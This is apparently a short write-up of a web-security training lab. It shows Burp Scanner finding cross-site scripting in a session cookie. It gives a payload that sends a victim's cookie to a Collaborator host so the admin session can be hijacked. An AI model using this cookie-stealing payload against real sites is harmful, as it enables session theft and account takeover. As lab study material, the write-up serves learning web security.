# Scanning non-standard data structures

After login to a account we can see a Cookie session that look like that,
```
Cookie: session=wiener%3agUyKvgMVBEueyyAjbXh4DPKsgkERC4pp
```

<img width="772" height="425" alt="image" src="https://github.com/user-attachments/assets/bedb34ec-9a01-48e3-a35c-14cacc945cbb" />


First part for this cookie look suspicious so we can Right-click and select Scan selected insertion point,
after some time we can saw that Auditor catch High vulnerability **Cross-site scripting**

<img width="1001" height="505" alt="image" src="https://github.com/user-attachments/assets/ec5aeb90-c234-4c80-a9b6-e44fe3c9fddb" />

Burp tell as what payload he use but to steal a cookie from admin we need to change is 

```
'"><svg/onload=fetch(`//Your-Collaborator/${encodeURIComponent(document.cookie)}`)>
```

And like that we can send a request to web and wait for victim to get his session and login to admin panel (remeber to encode payload and decode session)

<img width="1474" height="527" alt="image" src="https://github.com/user-attachments/assets/30e705c6-1aee-48aa-a861-7813f0ed9134" />

